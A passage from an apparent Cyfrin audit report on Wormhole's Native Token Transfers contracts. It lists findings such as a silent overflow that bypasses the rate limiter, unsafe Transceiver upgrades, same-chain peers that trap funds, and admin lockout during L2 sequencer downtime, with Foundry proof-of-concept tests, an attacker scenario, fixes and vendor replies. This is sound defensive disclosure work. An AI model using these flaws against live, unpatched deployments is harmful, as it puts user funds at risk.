        WormholeTransceiver.WormholeTransceiverInstruction memory instruction =
            IWormholeTransceiver.WormholeTransceiverInstruction(relayer_off);

        bytes memory encodedInstructionWormhole =
            wormholeTransceiverChain1.encodeWormholeTransceiverInstruction(instruction);

        TransceiverStructs.TransceiverInstruction memory TransceiverInstruction1 =
        TransceiverStructs.TransceiverInstruction({index: 0, payload: encodedInstructionWormhole});
        TransceiverStructs.TransceiverInstruction memory TransceiverInstruction2 =
        TransceiverStructs.TransceiverInstruction({index: 1, payload: encodedInstructionWormhole});

        TransceiverStructs.TransceiverInstruction[] memory TransceiverInstructions =
            new TransceiverStructs.TransceiverInstruction[](2);

        TransceiverInstructions[0] = TransceiverInstruction1;
        TransceiverInstructions[1] = TransceiverInstruction2;

        return TransceiverStructs.encodeTransceiverInstructions(TransceiverInstructions);
    }
}
```

**Recommended Mitigation:** Consider passing no instructions into the delivery price estimation when the Transceiver index does not exist.

**Wormhole Foundation:** Fixed in [PR \#360](https://github.com/wormhole-foundation/example-native-token-transfers/pull/360).

**Cyfrin:** Verified. The instructions array is now allocated using the number of registered Transceivers rather than the number of enabled Transceivers, fixing the case where Transceivers are enabled/disabled. This also fixes the case where new Transceivers are registered. Since the loop is over the parsed instructions length, those for any newly registered Transceivers will remain the default value (this logic also applies to the standard transfer call).

\clearpage
## Medium Risk


### Silent overflow in `TrimmedAmount::shift` could result in rate limiter being bypassed

**Description:** Within [`TrimmedAmount::trim`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/TrimmedAmount.sol#L136-L158), there is an explicit check that ensures the scaled amount does not exceed the maximum `uint64`:
```solidity
// NOTE: amt after trimming must fit into uint64 (that's the point of
// trimming, as Solana only supports uint64 for token amts)
if (amountScaled > type(uint64).max) {
    revert AmountTooLarge(amt);
}
```
However, no such check exists within [`TrimmedAmount::shift`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/TrimmedAmount.sol#L121-L129) which means there is potential for silent overflow when casting to `uint64` here:
```solidity
function shift(
    TrimmedAmount memory amount,
    uint8 toDecimals
) internal pure returns (TrimmedAmount memory) {
    uint8 actualToDecimals = minUint8(TRIMMED_DECIMALS, toDecimals);
    return TrimmedAmount(
        uint64(scale(amount.amount, amount.decimals, actualToDecimals)), actualToDecimals
    );
}
```

**Impact:** A silent overflow in `TrimmedAmount::shift` could result in the rate limiter being bypassed, considering its usage in [`NttManager::_transferEntryPoint`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManager.sol#L300). Given the high impact and reasonable likelihood of this issue occurring, it is classified a **MEDIUM** severity finding.

**Recommended Mitigation:** Explicitly check the scaled amount in `TrimmedAmount::shift` does not exceed the maximum `uint64`.

**Wormhole Foundation:** Fixed in [PR \#262](https://github.com/wormhole-foundation/example-native-token-transfers/pull/262).

**Cyfrin:** Verified. OpenZeppelin `SafeCast` library is now used when casting to `uint64`.


### Disabled Transceivers cannot be re-enabled by calling `TransceiverRegistry::_setTransceiver` after 64 have been registered

**Description:** [`TransceiverRegistry::_setTransceiver`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/TransceiverRegistry.sol#L112-L153) handles the registering of Transceivers, but note that they cannot be re-registered as this has other downstream effects, so this function is also responsible for the re-enabling of previously registered but currently disabled Transceivers.
```solidity
function _setTransceiver(address transceiver) internal returns (uint8 index) {
    /* snip */
    if (transceiver == address(0)) {
        revert InvalidTransceiverZeroAddress();
    }

    if (_numTransceivers.registered >= MAX_TRANSCEIVERS) {
        revert TooManyTransceivers();
    }

    if (transceiverInfos[transceiver].registered) {
        transceiverInfos[transceiver].enabled = true;
    } else {
    /* snip */
}
```

This function reverts if the passed transceiver address is `address(0)` or the number of registered transceivers is already at its defined maximum of 64. Assuming a total of 64 registered Transceivers, with some of these Transceivers having been previously disabled, the placement of this latter validation will prevent a disabled Transceiver from being re-enabled since the subsequent block in which the storage indicating its enabled state is set to `true` is not reachable. Consequently, it will not be possible to re-enable any disabled transceivers after having registered the maximum number of Transceivers, meaning that this function will never be callable without redeployment.

**Impact:** Under normal circumstances, this maximum number of registered Transceivers should never be reached, especially since the underlying Transceivers are upgradeable. However, while unlikely based on operational assumptions, this undefined behavior could have a high impact, and so this is classified as a **MEDIUM** severity finding.

**Recommended Mitigation:** Move the placement of the maximum Transceivers validation to within the `else` block that is responsible for handling the registration of new Transceivers.

**Wormhole Foundation:** Fixed in [PR \#253](https://github.com/wormhole-foundation/example-native-token-transfers/pull/253).

**Cyfrin:** Verified. The validation is now skipped for previously registered (but currently disabled) Transceivers.


### NTT Manager cannot be unpaused once paused

**Description:** `NttManagerState::pause` exposes pause functionality to be triggered by permissioned actors but has no corresponding unpause functionality. As such, once the NTT Manager is paused, it will not be possible to unpause without a contract upgrade.
```solidity
function pause() public onlyOwnerOrPauser {
    _pause();
}
```

**Impact:** The inability to unpause the NTT Manager could result in significant disruption, requiring either a contract upgrade or complete redeployment to resolve this issue.

**Recommended Mitigation:**
```diff
+ function unpause() public onlyOwnerOrPauser {
+     _unpause();
+ }
```

**Wormhole Foundation:** Fixed in [PR \#273](https://github.com/wormhole-foundation/example-native-token-transfers/pull/273).

**Cyfrin:** Verified. A corresponding unpause function has been added.


### Immutable gas limit within `WormholeTransceiver` can lead to execution failures on the target chain

**Description:** The Wormhole-specific Transceiver implementation uses an immutable [`gasLimit`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/Transceiver/WormholeTransceiver/WormholeTransceiverState.sol#L27) variable to calculate the Relayer delivery price. The underlying assumption here is that the gas consumed for transfers will always be static; however, this is not always the case, especially for L2 rollups such as Arbitrum, where gas is calculated as a function of the actual gas consumed on L2 and the L1 calldata cost that is effectively an L2 view of the L1 gas price. Please refer to the [Arbitrum docs](https://docs.arbitrum.io/inside-arbitrum-nitro#gas-and-fees) for more information on how gas is estimated.

In cases where L2 gas depends on the L1 gas price, extreme scenarios can occur where the delivery cost computed by the static gas limit is insufficient to execute a transfer on L2.

**Impact:** An immutable gas limit can give an extremely stale view of the L2 gas needed to execute a transfer. In extreme scenarios, such stale gas estimates can be insufficient to execute messages on a target chain. If such a scenario occurs, all pending messages with a stale gas estimate will risk being stuck on the target chain. While the gas limit can be changed via an upgrade, there are two issues with this approach:
1. Synchronizing a mass update across a large number of `NttManager` contracts might be difficult to execute.
2. Changing the gas limit has no impact on pending transfers that are already ready for execution on the target chain.

**Recommended Mitigation:** Consider making the gas limit mutable. If necessary, NTT Managers can keep track of L1 gas prices and change the gas limits accordingly.

**Wormhole Foundation:** This failure case can be handled by requesting redelivery with a higher gas limit. The current logic is the same as we use in our automatic relayers and we are ok with the current limitations of this design.

**Cyfrin:** Acknowledged.


### Transceiver invariants and ownership synchronicity can be broken by unsafe Transceiver upgrades

**Description:** Transceivers are upgradeable contracts integral to the cross-chain message handling of NTT tokens. While `WormholeTransceiver` is a specific implementation of the `Transceiver` contract, NTT Managers can integrate with Transceivers of any custom implementation.

[`Transceiver::_checkImmutables`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/Transceiver/Transceiver.sol#L72-L77) is an internal virtual function that verifies that invariants are not violated during an upgrade. Two checks in this function are that a) the NTT Manager address remains the same and b) the underlying NTT token address remains the same.

However, the current logic allows integrators to bypass these checks by either:
1. Overriding the `_checkImmutables()` function without the above checks.
2. Calling [`Implementation::_setMigratesImmutables`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/Implementation.sol#L101-L103) with a `true` input. This effectively bypasses the `_checkImmutables()` function validation during an upgrade.

Based on the understanding that Transceivers are deployed by integrators external to NTT Manager owners, regardless of the high trust assumptions associated with integrators, it is risky for NTT Managers to delegate power to Transceivers to silently upgrade a transceiver contract that can potentially violate the NTT Manager invariants.

One example of this involves the intended ownership model. Within [`Transceiver::_initialize`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/Transceiver/Transceiver.sol#L44-L53), the owner of the Transceiver is set to the owner of the `NttManager` contract:
```solidity
function _initialize() internal virtual override {
    // check if the owner is the deployer of this contract
    if (msg.sender != deployer) {
        revert UnexpectedDeployer(deployer, msg.sender);
    }

    __ReentrancyGuard_init();
    // owner of the transceiver is set to the owner of the nttManager
    __PausedOwnable_init(msg.sender, getNttManagerOwner());
}
```

However, the transferring of this ownership via `Transceiver::transferTransceiverOwnership` is only allowed by the NTT Manager itself:
```solidity
/// @dev transfer the ownership of the transceiver to a new address
/// the nttManager should be able to update transceiver ownership.
function transferTransceiverOwnership(address newOwner) external onlyNttManager {
    _transferOwnership(newOwner);
}
```

When the owner of the NTT Manager is changed by calling [`NttManagerState::transferOwnership`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L193-L203), the owner of all the Transceivers is changed with it:
```solidity
/// @notice Transfer ownership of the Manager contract and all Endpoint contracts to a new owner.
function transferOwnership(address newOwner) public override onlyOwner {
    super.transferOwnership(newOwner);
    // loop through all the registered transceivers and set the new owner of each transceiver to the newOwner
    address[] storage _registeredTransceivers = _getRegisteredTransceiversStorage();
    _checkRegisteredTransceiversInvariants();

    for (uint256 i = 0; i < _registeredTransceivers.length; i++) {
        ITransceiver(_registeredTransceivers[i]).transferTransceiverOwnership(newOwner);
    }
}
```

This design is intended to ensure that the NTT Manager's owner is kept in sync across all transceivers, access-controlled to prevent unauthorized ownership changes, but transceiver ownership can still be transferred directly as the public `OwnableUpgradeable::transferOwnership` function has not been overridden. Even if Transceiver ownership changes, the Manager is permitted to change it again via the above function.

However, this behavior can be broken if the new owner of a Transceiver performs a contract upgrade without the immutables check. In this way, they can change the NTT Manager, preventing the correct manager from having permissions as expected. As a result, `NttManagerState::transferOwnership` will revert if any one Transceiver is out of sync with the others, and since it is not possible to remove an already registered transceiver, this function will cease to be useful. Instead, each Transceiver will be forced to be manually updated to the new owner unless the modified Transceiver is reset back to the previous owner so that this function can be called again.

**Impact:** While this issue may require the owner of a Transceiver to misbehave, a scenario where a Transceiver is silently upgraded with a new NTT Manager or NTT Manager token can be problematic for cross-chain transfers and so is prescient to note.

**Proof of Concept:** The below PoC calls the `_setMigratesImmutables()` function with the `true` boolean, effectively bypassing the `_checkImmutables()` invariant check. As a result, a subsequent call to `NttManagerState::transferOwnership` is demonstrated to revert. This test should be added to the contract in `Upgrades.t.sol` before running, and the revert in `MockWormholeTransceiverContract::transferOwnership` should be removed to reflect the true functionality.

```solidity
function test_immutableUpgradePoC() public {
    // create the new mock ntt manager contract
    NttManager newImpl = new MockNttManagerContract(
        nttManagerChain1.token(), IManagerBase.Mode.BURNING, chainId1, 1 days, false
    );
    MockNttManagerContract newNttManager =
        MockNttManagerContract(address(new ERC1967Proxy(address(newImpl), "")));
    newNttManager.initialize();

    // transfer transceiver ownership
    wormholeTransceiverChain1.transferOwnership(makeAddr("new transceiver owner"));

    // create the new transceiver implementation, specifying the new ntt manager
    WormholeTransceiver wormholeTransceiverChain1Implementation = new MockWormholeTransceiverImmutableAllow(
        address(newNttManager),
        address(wormhole),
        address(relayer),
        address(0x0),
        FAST_CONSISTENCY_LEVEL,
        GAS_LIMIT
    );

    // perform the transceiver upgrade
    wormholeTransceiverChain1.upgrade(address(wormholeTransceiverChain1Implementation));

    // ntt manager ownership transfer should fail and revert
    vm.expectRevert(abi.encodeWithSelector(ITransceiver.CallerNotNttManager.selector, address(this)));
    nttManagerChain1.transferOwnership(makeAddr("new ntt manager owner"));
}
```

**Recommended Mitigation:** Consider making `Transceiver::_checkImmutables` and `Implementation::_setMigratesImmutables` private functions for Transceivers. If the `_checkImmutables()` function has to be overridden, consider exposing another function that is called inside `_checkImmutables` as follows:

```solidity
function _checkImmutables() private view override {
    assert(this.nttManager() == nttManager);
    assert(this.nttManagerToken() == nttManagerToken);
   _checkAdditionalImmutables();
}

function _checkAdditionalImmutables() private view virtual override {}
```

**Wormhole Foundation:** The manager is a trusted entity and will not deliberately break their own upgrades. The manager has the ability to set the owner for any transceiver, although most NTT deployments will likely share the same owner across all supported transceivers

**Cyfrin:** Acknowledged.


### Setting a peer `NttManager` contract for the same chain can cause loss of user funds

**Description:** The current implementation of `NttManager::setPeer` allows the owner to set the NTT Manager as a peer for the same chain ID as the current chain. If the NTT Manager owner accidentally (or otherwise) sets an arbitrary address as a peer `NttManager` address for the same chain, this configuration would allow a user to initiate a transfer with the same target chain as the source chain, but such transfers will not get executed on the target chain (which is same as source chain).

**Impact:** There is a potential loss of funds for the users. Even if the peer is subsequently removed, messages already sent from the source chain can never be executed. Any funds attached to those messages will be stuck in the `NttManager` contract.

**Proof of Concept:** The following test case shows that transactions fail on the destination chain.

```solidity
 function testTransferToOwnChain() external {
    uint16 localChainId = nttManager.chainId();
    DummyToken token = DummyToken(nttManager.token());
   uint8 decimals = token.decimals();
    nttManager.setPeer(localChainId, toWormholeFormat(address(0x999), decimals);

    address user_A = address(uint160(uint256(keccak256("user_A"))));
    address user_B = address(uint160(uint256(keccak256("user_B"))));

    token.mintDummy(address(user_A), 5 * 10 ** decimals);
    uint256 outboundLimit = 4 * 10 ** decimals;
    nttManager.setOutboundLimit(outboundLimit);

    // chk params before transfer
    IRateLimiter.RateLimitParams memory inboundLimitParams =
        nttManager.getInboundLimitParams(localChainId);
    IRateLimiter.RateLimitParams memory outboundLimitParams =
        nttManager.getOutboundLimitParams();

    assertEq(outboundLimitParams.limit.getAmount(), outboundLimit.trim(decimals, decimals).getAmount());
    assertEq(outboundLimitParams.currentCapacity.getAmount(), outboundLimit.trim(decimals, decimals).getAmount());
    assertEq(inboundLimitParams.limit.getAmount(), 0);
    assertEq(inboundLimitParams.currentCapacity.getAmount(), 0);

    vm.startPrank(user_A);
    uint256 transferAmount = 3 * 10 ** decimals;
    token.approve(address(nttManager), transferAmount);
    nttManager.transfer(transferAmount, localChainId, toWormholeFormat(user_B), false, new bytes(1));

    vm.stopPrank();


    // chk params after transfer

    // assert outbound rate limit has decreased
    outboundLimitParams = nttManager.getOutboundLimitParams();
    assertEq(
        outboundLimitParams.currentCapacity.getAmount(),
        (outboundLimit - transferAmount).trim(decimals, decimals).getAmount()
    );
    assertEq(outboundLimitParams.lastTxTimestamp, initialBlockTimestamp);

    // assert inbound rate limit for destination chain is still 0.
    // the backflow should not override the limit.
    inboundLimitParams =
        nttManager.getInboundLimitParams(localChainId);


    assertEq(inboundLimitParams.limit.getAmount(), 0);
    assertEq(inboundLimitParams.currentCapacity.getAmount(), 0);
}

function testSameChainEndToEndTransfer() public {
    vm.chainId(chainId1);

    // Setting up the transfer
    DummyToken token1 = DummyToken(nttManagerChain1.token());

    uint8 decimals = token1.decimals();
    uint256 sendingAmount = 5 * 10 ** decimals;
    token1.mintDummy(address(userA), 5 * 10 ** decimals);
    vm.startPrank(userA);
    token1.approve(address(nttManagerChain1), sendingAmount);

    vm.recordLogs();

    // Send token through standard means (not relayer)
    {

        uint256 userBalanceBefore = token1.balanceOf(address(userA));
        nttManagerChain1.transfer(sendingAmount, chainId1, bytes32(uint256(uint160(userB))));

        // Balance check on funds going in and out working as expected
        uint256 userBalanceAfter = token1.balanceOf(address(userA));

        require(
            userBalanceBefore - sendingAmount == userBalanceAfter,
            "User should have sent tokens"
        );
    }

    vm.stopPrank();

    // Get and sign the log to go down the other pipe. Thank you to whoever wrote this code in the past!
    Vm.Log[] memory entries = guardian.fetchWormholeMessageFromLog(vm.getRecordedLogs());
    bytes[] memory encodedVMs = new bytes[](entries.length);
    for (uint256 i = 0; i < encodedVMs.length; i++) {
        encodedVMs[i] = guardian.fetchSignedMessageFromLogs(entries[i], chainId1);
    }

    {
        uint256 supplyBefore = token1.totalSupply();

        vm.expectRevert(abi.encodeWithSelector(UnexpectedRecipientNttManagerAddress.selector, toWormholeFormat(address(nttManagerChain1)), toWormholeFormat(address(0x999))));
        wormholeTransceiverChain1.receiveMessage(encodedVMs[0]);
        uint256 supplyAfter = token1.totalSupply();

        // emit log_named_uint("sending amount on chain 1", sendingAmount);
        // emit log_named_uint("minting amount on chain 1", supplyAfter - supplyBefore);
        // // require(supplyAfter > sendingAmount + supplyBefore , "Supplies dont match");
        // // require(token1.balanceOf(userB) == sendingAmount, "User didn't receive tokens");
    }
}
```

**Recommended Mitigation:** Using cross-chain infrastructure to make transfers within the same chain makes little sense and can lead to loss of user funds if configured in this way. Consider preventing NTT Manager owners from setting peers for the same chain.

**Wormhole Foundation:** Fixed in [PR \#365](https://github.com/wormhole-foundation/example-native-token-transfers/pull/365).

**Cyfrin:** Verified. Validation has been added to prevent the same chain as a peer.


### Lack of a gas refund in the current design can lead to the overcharging of users and misaligned relayer incentives that can choke message execution

**Description:** To understand gas handling, it is important to highlight a few key aspects of the current design:

1. On the target chain, Transceivers can either attest to a message or attest and execute a message. Transceivers up to the threshold attest to a message, while the Transceiver who will cause the threshold to be reached attests and executes a message.

2. Each transceiver quotes a gas estimate on the source chain. When quoting a price, no Transceiver knows if its peer on the target chain will simply attest to a message or both attest and execute a message. This means that every Transceiver quotes a gas estimate that assumes its peer will be executing a message.

Based on the two above facts, the following can be deduced:

1. If the threshold has not yet been reached, a sender is paying a delivery fee for every Transceiver, even ones that are attesting a message after it was already executed.
2. The sender is paying for a scenario where every Transceiver is responsible for executing a message on the target chain. In reality, only one transceiver will execute, and all others will attest.
3. If a relayer consistently calls a Transceiver before the threshold is reached, a relayer will earn more than is spent in terms of gas.
4. The above point incentivizes relayers to always be the ones to attest and not to execute. A clever relayer can simply query `messageAttestations` off-chain and skip a delivery if `messageAttestations == threshold - 1`, since a relayer spends less gas than what they charged on the source chain if they deliver before OR after a threshold is met.

**Impact:**
1. Users are overcharged on the source chain without recourse due to the lack of a refund mechanism.
2. Relayers can choke message execution by skipping execution of the message that meets the attestation threshold. Current economic incentives benefit relayers if they skip this specific message.

**Recommended Mitigation:** In the case of standard relayers, consider a mechanism to refund excess gas to the recipient address on the target chain. `DeliveryProvider:: quoteEvmDeliveryPrice ` in the core Wormhole codebase returns a `targetChainRefundPerUnitGasUnused` parameter that is currently unused. Consider using this input to calculate the excess fee that can be refunded to the senders. Doing so will not only save costs for users but also remove any misaligned economic incentives for the relayers.

**Wormhole Foundation:** Fixed in [PR \#326](https://github.com/wormhole-foundation/example-native-token-transfers/pull/326).

**Cyfrin:** Verified. Transceivers now receive a refund address, and standard relaying for the `WormholeTransceiver` now issues refunds.


### Access-controlled functions cannot be called when L2 sequencers are down

**Description:** Given that rollups such as [Optimism](https://docs.optimism.io/chain/differences#address-aliasing) and [Arbitrum](https://docs.arbitrum.io/arbos/l1-to-l2-messaging#address-aliasing) offer methods for forced transaction inclusion, it is important that the aliased sender address is also [checked](https://solodit.xyz/issues/m-8-operator-is-blocked-when-sequencer-is-down-on-arbitrum-sherlock-none-index-git) within access control modifiers when verifying the sender holds a permissioned role to allow the functions to which they are applied to be called even in the event of sequencer downtime. The most pertinent examples include:

* [`PausableOwnable::_checkOwnerOrPauser`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/PausableOwnable.sol#L17-L24), which is called in the [`onlyOwnerOrPauser`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/PausableOwnable.sol#L9-L15) modifier, which itself is applied to [`PausableOwnable::transferPauserCapability`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/PausableOwnable.sol#L31-L39) and, more importantly, [`NttManagerState::pause`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L188-L191).
* [`OwnableUpgradeable::_checkOwner`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/external/OwnableUpgradeable.sol#L83-L90) which is called in the [`onlyOwner`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/external/OwnableUpgradeable.sol#L67-L73) modifier, which itself is applied to [`OwnableUpgradeable::transferOwnership`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/external/OwnableUpgradeable.sol#L92-L101), [`NttManagerState::upgrade`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L183-L186), [`NttManagerState::transferOwnership`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L193-L203), [`NttManagerState::setTransceiver`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L205-L228), [`NttManagerState::removeTransceiver`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L230-L242), [`NttManagerState::setThreshold`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L244-L257), [`NttManagerState::setPeer`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L259-L281), [`NttManagerState::setOutboundLimit`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L283-L286), [`NttManagerState::setInboundLimit`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L288-L291), and [`Transceiver::upgrade`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/Transceiver/Transceiver.sol#L66-L68).
* The [`onlyRelayer`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/Transceiver/WormholeTransceiver/WormholeTransceiverState.sol#L274-L279) modifier which is applied to [`WormholeTransceiver::receiveWormholeMessages`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/Transceiver/WormholeTransceiver/WormholeTransceiver.sol#L64-L105).

**Impact:** Failure to consider the aliased sender address prevents the execution of admin or otherwise permissioned functionality on a chain where transactions are batched by a centralized L2 sequencer. Since this functionality could be time-sensitive, such as the urgent pausing of the protocol or the relaying of NTT messages, this issue has the potential to have a high impact with reasonable likelihood.

**Proof of Concept:** While potentially unlikely, a possible scenario could include:

1. An attacker identifies an exploit in the NTT Managers protocol on the source chain and plans to bridge stolen funds to the Ethereum mainnet. Assume the source chain is an L2 rollup that batches transactions for publishing onto the L1 chain via a centralized sequencer.
2. The L2 sequencer goes down; however, transactions can still be executed via forced inclusion on the L1 chain. The Attacker could either have forced or waited for this to happen.
3. The Attacker exploits the protocol and initiates a native token transfer, kicking off the 24-hour rate limit duration. Assume the outbound rate limit is hit on the L2, but the inbound limit is not exceeded on the Ethereum mainnet.
4. Access-controlled functions are not callable since they do not check the aliased sender address, so admin transactions cannot be force-included from L1, e.g. pause the protocol.
5. The rate limit duration passes, and the sequencer is still down  the attacker completes the outbound transfer (assuming attestations are made) and relays the message on the Ethereum mainnet.

**Recommended Mitigation:** Validation of the sender address against permissioned owner/pauser/relayer roles should also consider the aliased equivalents to allow access-controlled functionality to be executed via forced inclusion. Another relevant precaution for the exploit case described above is to reduce the inbound rate limit of the affected chain to zero, which should work to mitigate this issue so long as the transaction can be successfully executed on the destination (i.e. it is not also an L2 rollup simultaneously experiencing sequencer downtime).

**Wormhole Foundation:** There hasnt been an extensive L2 sequencer downtime event lasting more than a few hours. We think its unlikely an attacker would hold on to a vulnerability to coincide with a downtime event, and we have the rate limiter to cap impact with the assumption the downtime doesnt last longer than a few hours.

**Cyfrin:** Acknowledged.

\clearpage
## Low Risk


### Inconsistent implementation of ERC-7201 Namespaced Storage locations

**Description:** Regarding the implementation of Namespaced Storage locations, the EIP-7201 formula should be followed to strictly conform to the EIP specification, as is correctly done by the modified OpenZeppelin libraries in `libraries/external`; elsewhere, usage is incorrect.

Additionally, there are instances where the location strings appear inconsistent, for example, `Pause.pauseRole`, which should likely instead be `Pauser.pauserRole`.

**Impact:** Namespaces are implemented to avoid collisions with other namespaces or the standard Solidity storage layout. The formula defined in EIP-7201 guarantees this property for arbitrary namespace IDs under the assumption of keccak256 collision resistance. It is, therefore, important to ensure that its implementation is consistent to fully benefit from these assurances.

**Recommended Mitigation:** Use the formula outlined in the [EIP](https://eips.ethereum.org/EIPS/eip-7201) to update all other instances in `src/*`:
```solidity
keccak256(abi.encode(uint256(keccak256("example.location")) - 1)) & ~bytes32(uint256(0xff));
```

**Wormhole Foundation:** Although we dont conform to the EIP, we believe our storage slots are still collision-resistant.

**Cyfrin:** Acknowledged.


### Asymmetry in Transceiver pausing capability

**Description:** Pausing functionality is exposed via `Transceiver::_pauseTransceiver`; however, there is no corresponding function that exposes unpausing functionality:
```solidity
/// @dev pause the transceiver.
function _pauseTransceiver() internal {
    _pause();
}
```

**Impact:** While not an immediate issue since the above function is not currently in use anywhere, this should be resolved to avoid cases where Transceivers could become permanently paused.

**Recommended Mitigation:**
```diff
+ /// @dev unpause the transceiver.
+ function _unpauseTransceiver() internal {
+     _unpause();
+ }
```

**Wormhole Foundation:** Fixed in [PR \#273](https://github.com/wormhole-foundation/example-native-token-transfers/pull/273).

**Cyfrin:** Verified. `Transceiver::_pauseTransceiver` has been removed.


### Incorrect Transceiver payload prefix definition

**Description:** The `WH_TRANSCEIVER_PAYLOAD_PREFIX` constant in `WormholeTransceiverState.sol` contains invalid ASCII bytes and, as such, does not match what is written in the inline developer documentation:
```solidity
/// @dev Prefix for all TransceiverMessage payloads
///      This is 0x99'E''W''H'
/// @notice Magic string (constant value set by messaging provider) that idenfies the payload as an transceiver-emitted payload.
///         Note that this is not a security critical field. It's meant to be used by messaging providers to identify which messages are Transceiver-related.
bytes4 constant WH_TRANSCEIVER_PAYLOAD_PREFIX = 0x9945FF10;
```
The correct payload prefix is `0x99455748`, which is output when running the following command:
```bash
cast --from-utf8 "EWH"
```

**Impact:** While still a valid 4-byte hex prefix, used purely for identification purposes, an incorrect prefix could cause downstream confusion and result in otherwise valid Transceiver payloads being incorrectly prefixed.

**Recommended Mitigation:** Update the constant definition to use the correct prefix corresponding to the documented string:
```diff
+ bytes4 constant WH_TRANSCEIVER_PAYLOAD_PREFIX = 0x99455748;
```

**Wormhole Foundation:** Changing this prefix has no material impact since its still a valid `bytes4` constant. We elected to keep this unchanged due to downstream dependencies.

**Cyfrin:** Acknowledged.


### `WormholeTransceiver` EVM chain IDs storage cannot be updated

In the unlikely but possible scenario in which a registered EVM-compatible chain diverges as the result of an upgrade, the existing implementation of [`WormholeTransceiverState::setIsWormholeEvmChain`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/Transceiver/WormholeTransceiver/WormholeTransceiverState.sol#L228-L236) means that it will not be possible to update the corresponding storage. If, for whatever reason, a chain such as Optimism decides to move away from EVM (the opposite of what happened in reality, going from OVM to EVM), its chain ID will now correspond to a non-EVM chain. As such, this function should take a boolean argument, similar to the [other functions](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/Transceiver/WormholeTransceiver/WormholeTransceiverState.sol#L238-L256) defined below this one:
```diff
- function setIsWormholeEvmChain(uint16 chainId) external onlyOwner {
+ function setIsWormholeEvmChain(uint16 chainId, bool isEvm) external onlyOwner {
    if (chainId == 0) {
        revert InvalidWormholeChainIdZero();
    }
-     _getWormholeEvmChainIdsStorage()[chainId] = TRUE;
+     _getWormholeEvmChainIdsStorage()[chainId] = toWord(isEvm);

-     emit SetIsWormholeEvmChain(chainId);
+     emit SetIsWormholeEvmChain(chainId, isEvm);
}
```
The `SetIsWormholeEvmChain` event will also need to be modified to take this additional boolean field.

**Wormhole Foundation:** Fixed in [PR \#252](https://github.com/wormhole-foundation/example-native-token-transfers/pull/252).

**Cyfrin:** Verified. The storage can now be modified due to the addition of an `isEvm` boolean argument.


### Missing threshold invariant check when adding/removing transceivers

**Description:** [`NttManagerState::_checkThresholdInvariants`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L371-L385) is intended to check invariant properties related to the threshold storage and is called on initialization, migration, and access-controlled setting of the threshold storage directly. However, this function is not currently called when the [`setTransceiver()`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L205-L228) and [removeTransceiver()](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManagerState.sol#L230-L242) functions execute, which also access and modify the relevant state.

